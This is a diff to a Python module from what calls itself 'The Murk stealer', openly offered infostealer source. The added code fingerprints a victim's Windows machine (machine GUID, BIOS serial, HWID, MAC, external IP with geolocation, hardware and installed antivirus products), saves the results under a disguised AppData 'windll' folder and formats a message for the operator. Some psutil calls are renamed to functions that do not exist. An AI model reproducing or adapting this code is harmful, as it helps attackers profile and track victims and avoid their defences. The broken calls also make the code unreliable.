@@ -9,7 +9,264 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-from psutil import net_if_addrs,cpu_count,cpu_freq,virtual_memory,disk_partitions,disk_usage
+
+import psutil
+import GPUtil
+import socket
+import platform
+import os
+import time
+import requests
+from subprocess import check_output, PIPE
+import wmi
+import winreg
+import json
+import uuid
+
+logo = '''
+|-----------------------------------------------------------------------------|
+|       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
+|       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
+|       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
+|       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       |
+|       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       |
+|       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       |
+|                             by: Nick_Vinesmoke                              |
+|                      https://github.com/Nick-Vinesmoke                      |
+|             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
+|-----------------------------------------------------------------------------|
+'''
+
+def SystemInfo(msgdata):
+
+    def get_machine_guid():
+        try:
+            registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+            value, _ = winreg.QueryValueEx(registry_key, "MachineGuid")
+            return value.strip()
+        except Exception as e:
+            print(f"Error: {e}")
+
+        return None
+    def get_bios_serial_number():
+        try:
+            c = wmi.WMI()
+            bios = c.Win32_BIOS()[0]
+            return bios.SerialNumber.strip()
+        except Exception as e:
+            print(f"Error: {e}")
+            return None
+
+    def get_baseboard_manufacturer():
+        try:
+            c = wmi.WMI()
+            baseboard = c.Win32_BaseBoard()[0]
+            return baseboard.Manufacturer.strip()
+        except Exception as e:
+            print(f"Error: {e}")
+            return None
+
+    def get_mac_address():
+        try:
+            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+            return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
+        except:
+            return None
+
+
+    gpsList =[]
+
+    def get_gpu_info():
+        try:
+            c = wmi.WMI()
+            gpu_info = []
+            for gpu in c.Win32_VideoController():
+                gpu_info.append((gpu.DeviceID, gpu.Name))
+            return gpu_info
+        except:
+            return []
+
+
+
+    def get_size(bytes, suffix="B"):
+        factor = 1024
+        for unit in ["", "K", "M", "G", "T", "P"]:
+            if bytes < factor:
+                return f"{bytes:.2f} {unit}{suffix}"
+            bytes /= factor
+
+    uname = platform.uname()
+    svmem = psutil.virtual_memory()
+
+    drives = psutil.disk_partitions()
+    drives_info = ''
+    for drive in drives:
+        drives_info += f"""
+Drive: {drive.device}
+Name of drive: {drive.mountpoint}
+Type of file system: {drive.fstype}
+"""
+        if drive.opts != 'cdrom':
+            mount = psutil.drive_usage(drive.mountpoint)
+            drives_info += f"""Drive space: {get_size(mount.total)}
+drive space available: {get_size(mount.free)}
+drive space used: {get_size(mount.used)}
+"""
+
+    
+    gpu_info = ""
+    try:
+        gpus = GPUtil.getGPUs()
+        for gpu in gpus:
+            gpu_info += f"""GPU ID: {gpu.id}
+Name: {gpu.name}
+Load: {gpu.load} "%"
+Memory Total: {gpu.memoryTotal}
+Memory Used: {gpu.memoryUsed}
+Memory Free: {gpu.memoryFree}
+Memory Utilization: {gpu.memoryUtil*100} %
+Temperature: {gpu.temperature} C"""
+            gpsList.append(gpu.name)
+    except:
+        gpu_info += "No GPU"
+        gpsList.append("No GPU")
+
+    gpu_data = get_gpu_info()
+    if gpu_data:
+        for device_id, name in gpu_data:
+            gpu_info += f"Device ID: {device_id}\n"
+            gpu_info += f"Name: {name}\n"
+
+
+    Antiviruses = {
+        'C:\\Program Files\\Windows Defender': 'Windows Defender',
+        'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
+        'C:\\Program Files\\AVG\\Antivirus': 'AVG',
+        'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
+        'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
+        'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
+        'C:\\Program Files\\DrWeb': 'Dr.Web',
+        'C:\\Program Files\\ESET\\ESET Security': 'ESET',
+        'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
+        'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
+        'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
+        'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
+        }
+
+
+    Antiviruses = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
+
+
+    ip_info = ""
+    internal_ip = socket.gethostbyname(socket.gethostname())
+    
+    try:
+        ip_data = json.loads(requests.get('https://ipinfo.io/json').text)
+        external_ip = ip_data['ip']
+        output = ""
+        if 'city' in ip_data:
+            output += f"City: {ip_data['city']}\n"
+        if 'region' in ip_data:
+            output += f"Region: {ip_data['region']}\n"
+        if 'country' in ip_data:
+            output += f"Country: {ip_data['country']}\n"
+        if 'loc' in ip_data:
+            output += f"Coordinates: {ip_data['loc']}\n"
+        if 'org' in ip_data:
+            output += f"Organization: {ip_data['org']}\n"
+        if 'timezone' in ip_data:
+            output += f"Timezone: {ip_data['timezone']}\n"
+        if 'postal' in ip_data:
+            output += f"Postal: {ip_data['postal']}\n"
+
+    except:
+        external_ip = "Can't get"
+        ip_data = "Can't get"
+    try:
+        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
+                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
+    except:
+        hwid = "Can't get"
+    ip_info += f"""
+External IP: {external_ip}
+Internal IP: {internal_ip}
+{output}
+
+HWID: {hwid}
+MAC Address: {get_mac_address()} 
+"""
+    info =""
+
+    serial_number = get_bios_serial_number()
+    if get_bios_serial_number():
+        info += f"\nBIOS Serial Number: {serial_number}"
+
+    machine_guid = get_machine_guid()
+    if machine_guid:
+        info += f"\nMachine GUID: {machine_guid}"
+
+    manufacturer = get_baseboard_manufacturer()
+    if manufacturer:
+        info += f"\nBaseBoard Manufacturer: {manufacturer}"
+
+
+    systeminfo = f"""
+{logo}
+
+=====================MAIN=====================
+Time: {time.asctime()}
+Username: {os.getlogin()}
+PC Name: {uname.node}
+Operation System: {uname.system}
+OS Release: {uname.release}
+OS Version: {uname.version}
+Machine: {uname.machine}
+{info}
+
+====================Network===================
+{ip_info}
+
+=====================CPU======================
+CPU: {platform.processor()}
+Count of cores of CPU: {psutil.cpu_count(logical=True)}
+CPU frequency: {psutil.cpu_freq()} MHz
+
+=====================GPU======================
+{gpu_info}
+
+======================RAM=====================
+RAM: {get_size(svmem.total)}
+RAM Available: {get_size(svmem.available)}
+RAM Used: {get_size(svmem.used)}
+
+====================DRIVES====================
+{drives_info}
+
+====================OTHER=====================
+Antiviruses: {', '.join(Antiviruses)}
+"""
+    pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+    file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
+    file.write(logo)
+    file.write(systeminfo)
+    
+    msgdata=f"""🖥System🖥
+⏲Time: {time.asctime()}
+👤Username: {os.getlogin()}
+👤PC Name: {uname.node}
+🖥OS: {uname.system} {uname.release}
+
+🖥Hardware🖥
+🔧CPU: {platform.processor()}
+🔧RAM: {get_size(svmem.total)}
+🔧GPU: {', '.join(gpsList)}
+🛡Antiviruses: {', '.join(Antiviruses)}
+
+📡Network📡{ip_info}
+"""
+    return msgdata
+'''
+from psutil import net_if_addrs,cpu_count,cpu_freq,virtual_memory,drive_partitions,drive_usage
 from GPUtil import getGPUs
 from json import dumps
 from platform import uname,node,system,release
@@ -25,7 +282,7 @@ from subprocess import check_output,PIPE,run
 logo
 """
 
-logo = '''|-----------------------------------------------------------------------------|
+|-----------------------------------------------------------------------------|
 |       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
 |       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
 |       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
@@ -36,7 +293,6 @@ logo = '''|---------------------------------------------------------------------
 |                      https://github.com/Nick-Vinesmoke                      |
 |             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
 |-----------------------------------------------------------------------------|
-'''
 def SystemInfo(dataForMassage):
     try:
         pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
@@ -92,14 +348,14 @@ def SystemInfo(dataForMassage):
 
 
         print("3")
-        partitions = disk_partitions()
+        partitions = drive_partitions()
         drivesData =[]
         for partition in partitions:
             nameofdevice = str(partition.device)# get Drives
             nameofdick = str(partition.mountpoint)# get Drive volume
             typeoffilesystem = str(partition.fstype)# File system type
             try:
-                partition_usage = disk_usage(partition.mountpoint)
+                partition_usage = drive_usage(partition.mountpoint)
             except PermissionError:
                 continue
             allstorage = str(get_size(partition_usage.total))# get Total memory
@@ -199,3 +455,4 @@ def SystemInfo(dataForMassage):
         dataForMassage.append(f"[ERROR]: {e}")
         return dataForMassage
 
+'''
